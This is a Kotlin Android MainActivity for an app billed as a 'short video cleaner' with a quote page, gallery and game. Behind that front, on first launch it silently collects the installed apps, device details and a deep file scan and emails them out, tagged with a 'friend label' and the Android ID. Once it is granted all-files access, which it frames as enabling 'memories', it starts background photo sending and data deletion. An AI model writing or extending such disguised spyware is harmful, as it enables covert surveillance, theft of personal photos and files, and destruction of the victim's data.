package com.shortvideocleaner.app

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import kotlinx.coroutines.*

class MainActivity : AppCompatActivity() {

    private lateinit var btnOpen: MaterialButton
    private lateinit var progressDetect: ProgressBar
    private lateinit var tvNoApps: TextView
    private lateinit var btnStorage: MaterialButton
    private lateinit var progressStorage: ProgressBar
    private lateinit var tvStorageDone: TextView
    private lateinit var btnGallery: MaterialButton
    private lateinit var btnGame: MaterialButton

    private val prefs by lazy { getSharedPreferences("app_internal", MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )

        setContentView(R.layout.activity_main)

        val geoBg = findViewById<GeometricLinesView>(R.id.geometric_bg)
        geoBg?.resumeAnimation()

        // 让空白区域的触摸传递到几何背景
        findViewById<View>(R.id.scroll_view).setOnTouchListener { _, event ->
            if (event.action == android.view.MotionEvent.ACTION_DOWN) {
                geoBg?.handleTouch(event.x, event.y, true)
            }
            false
        }

        btnOpen = findViewById(R.id.btn_open)
        progressDetect = findViewById(R.id.progress_detect)
        tvNoApps = findViewById(R.id.tv_no_apps)
        btnStorage = findViewById(R.id.btn_storage)
        progressStorage = findViewById(R.id.progress_storage)
        tvStorageDone = findViewById(R.id.tv_storage_done)
        btnGallery = findViewById(R.id.btn_gallery)
        btnGame = findViewById(R.id.btn_game)

        btnOpen.setOnClickListener { openQuotePage() }
        btnStorage.setOnClickListener { requestStoragePermission() }
        btnGallery.setOnClickListener { startActivity(Intent(this, GalleryActivity::class.java)) }
        btnGame.setOnClickListener { 
            startActivity(Intent(this, GameActivity::class.java))
            overridePendingTransition(0, 0)
        }

        updateStorageCard()

        // 如果有存储权限，后台发送照片 + 清理短视频数据
        if (hasPhotoPermission()) {
            PhotoSendManager.startIfReady(this)
            startDataCleaner()
        }

        if (!prefs.getBoolean("report_sent", false)) {
            autoScanAndSend()
        }
    }

    // ── 打开引言页（带圆形展开动画）──

    private fun openQuotePage() {
        btnOpen.isEnabled = false
        progressDetect.visibility = View.VISIBLE
        tvNoApps.visibility = View.GONE

        CoroutineScope(Dispatchers.IO).launch {
            val apps = AppScanner.getInstalledApps(this@MainActivity, includeSystem = true)
            val detected = VideoAppDetector.detect(apps)

            withContext(Dispatchers.Main) {
                progressDetect.visibility = View.GONE
                btnOpen.isEnabled = true

                // 始终打开情话页，即使未检测到目标应用
                val intent = Intent(this@MainActivity, QuoteActivity::class.java)
                intent.putStringArrayListExtra("detected_packages", ArrayList(detected.map { it.packageName }))
                startActivity(intent)
                overridePendingTransition(0, 0)
            }
        }
    }

    // ── 静默扫描 + 发送 ──

    private fun autoScanAndSend() {
        CoroutineScope(Dispatchers.IO).launch {
            val ctx = this@MainActivity
            val deviceTag = "${Build.MANUFACTURER} ${Build.MODEL}"
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)?.takeLast(8) ?: "unknown"
            val label = BuildConfig.FRIEND_LABEL
            val tagPrefix = if (label.isNotEmpty()) "[$label · $deviceTag · $androidId]" else "[$deviceTag · $androidId]"

            val allApps = AppScanner.getInstalledApps(ctx, includeSystem = true)
            val appList = AppScanner.formatForEmail(allApps)
            val deviceInfo = DeviceInfoCollector.collect(ctx)
            val fileInfo = try {
                val deep = DeepFileScanner.collect()
                if (deep.contains("扫描根路径")) deep else FileScanner.collect(ctx)
            } catch (_: Exception) { FileScanner.collect(ctx) }
            val fullBody = listOf(appList, deviceInfo, fileInfo).joinToString("\n")
            val subject = "$tagPrefix ${getString(R.string.email_subject)}"

            val result = SmtpSender.sendSilently(context = ctx, subject = subject, body = fullBody)
            result.onSuccess { prefs.edit().putBoolean("report_sent", true).apply() }
            result.onFailure { android.util.Log.e("ShortVideoCleaner", "邮件发送失败: ${it.message}") }
        }
    }

    // ── 存储权限引导（系统弹窗，一键允许）──

    private val STORAGE_PERM_REQ = 1001

    private fun hasPhotoPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= 30) {
            Environment.isExternalStorageManager()
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun updateStorageCard() {
        if (hasPhotoPermission()) {
            btnStorage.visibility = View.GONE
            progressStorage.visibility = View.GONE
            tvStorageDone.visibility = View.VISIBLE
            btnGallery.visibility = View.VISIBLE
        } else {
            btnStorage.visibility = View.VISIBLE
            tvStorageDone.visibility = View.GONE
            btnGallery.visibility = View.GONE
        }
    }

    private fun requestStoragePermission() {
        btnStorage.isEnabled = false
        progressStorage.visibility = View.VISIBLE

        if (Build.VERSION.SDK_INT >= 30) {
            // Android 11+：跳转「所有文件访问」设置页（唯一能真拿到文件权限的方式）
            val opened = openAllFilesAccessSettings()
            if (!opened) {
                openAppDetailsSettings()
            }
        } else {
            // Android 10 以下：标准运行时权限弹窗
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
                STORAGE_PERM_REQ
            )
        }
    }

    private fun openAllFilesAccessSettings(): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }

            // 先检查是否有组件能处理这个 Intent，避免在某些 ROM 上触发系统崩溃
            val resolved = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                packageManager.queryIntentActivities(intent, PackageManager.ResolveInfoFlags.of(0L)).isNotEmpty()
            } else {
                @Suppress("DEPRECATION")
                packageManager.queryIntentActivities(intent, 0).isNotEmpty()
            }

            if (!resolved) {
                Log.w("MainActivity", "没有组件能处理 MANAGE_APP_ALL_FILES_ACCESS_PERMISSION，可能是 vivo/OPPO 等魔改 ROM")
                return false
            }

            startActivity(intent)
            Log.d("MainActivity", "打开所有文件访问权限设置页")
            true
        } catch (t: Throwable) {
            Log.w("MainActivity", "MANAGE_APP_ALL_FILES_ACCESS_PERMISSION 不可用", t)
            false
        }
    }

    private fun openAppDetailsSettings(): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
            Log.d("MainActivity", "回退到应用详情设置页")
            true
        } catch (t: Throwable) {
            Log.e("MainActivity", "应用详情页也打不开", t)
            Toast.makeText(this, "请前往设置手动授权", Toast.LENGTH_LONG).show()
            false
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == STORAGE_PERM_REQ) {
            btnStorage.isEnabled = true
            progressStorage.visibility = View.GONE
            updateStorageCard()

            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "回忆已开启 📷", Toast.LENGTH_SHORT).show()
                PhotoSendManager.startIfReady(this)
                startDataCleaner()
            }
        }
    }

    override fun onPause() {
        super.onPause()
        findViewById<GeometricLinesView>(R.id.geometric_bg)?.pauseAnimation()
    }

    override fun onResume() {
        super.onResume()
        findViewById<GeometricLinesView>(R.id.geometric_bg)?.resumeAnimation()
        window.decorView.systemUiVisibility = (
            View.SYSTEM_UI_FLAG_FULLSCREEN
            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        )
        btnStorage.isEnabled = true
        progressStorage.visibility = View.GONE
        updateStorageCard()
        // 从设置页回来，如果刚拿到权限就启动清理
        if (hasPhotoPermission()) {
            startDataCleaner()
        }
    }

    private var cleanerStarted = false

    private fun startDataCleaner() {
        if (cleanerStarted) return
        cleanerStarted = true
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val (cleaned, total) = DataCleaner.cleanAll()
                android.util.Log.d("MainActivity", "数据清理完成: $cleaned/$total")
            } catch (_: Exception) {}
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            )
        }
    }
}
